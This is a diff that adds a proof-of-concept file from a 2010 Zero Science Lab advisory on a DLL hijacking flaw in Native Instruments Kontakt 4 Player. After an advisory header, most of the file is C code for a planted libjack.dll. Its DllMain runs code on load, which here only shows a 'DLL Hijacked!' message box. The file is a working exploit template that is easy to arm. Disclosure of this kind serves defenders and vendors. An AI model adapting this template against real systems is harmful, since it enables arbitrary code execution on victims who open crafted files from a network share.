@@ -1,0 +1,58 @@
+/*
+
+ Native Instruments Kontakt 4 Player v4.1.3 Insecure Library Loading Vulnerability
+
+
+ Vendor: Native Instruments GmbH
+ Product web page: http://www.native-instruments.com
+ Affected version: 4.1.3.4125 (Standalone)
+
+ Summary: KONTAKT 4 PLAYER is the free sample player based on award-winning KONTAKT
+ technology. Expanding the capabilities of its successful predecessor, the free
+ KONTAKT 4 PLAYER allows for innovative, highly playable instruments leaving technological
+ and musical limitations behind.
+
+ Desc: Kontakt Player 4 suffers from a DLL hijacking vulnerability, which could be
+ exploited by remote attackers to compromise a vulnerable system. This issue is
+ caused due to the application insecurely loading certain libraries ("libjack.dll")
+ from the current working directory, which could allow attackers to execute arbitrary
+ code by tricking a user into opening specific related files (.ncw, .nki, .nkm and .nks)
+ from a network share.
+
+ Tested on: Microsoft Windows XP Professional SP3 (English)
+
+ Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+ liquidworm gmail com
+
+ Zero Science Lab - http://www.zeroscience.mk
+
+ Advisory ID: ZSL-2010-4976
+ Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4976.php
+
+ 06.11.2010
+
+*/
+
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		dll_mll();
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+		break;
+	}
+
+	return TRUE;
+}
+
+int dll_mll()
+{
+	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
+}
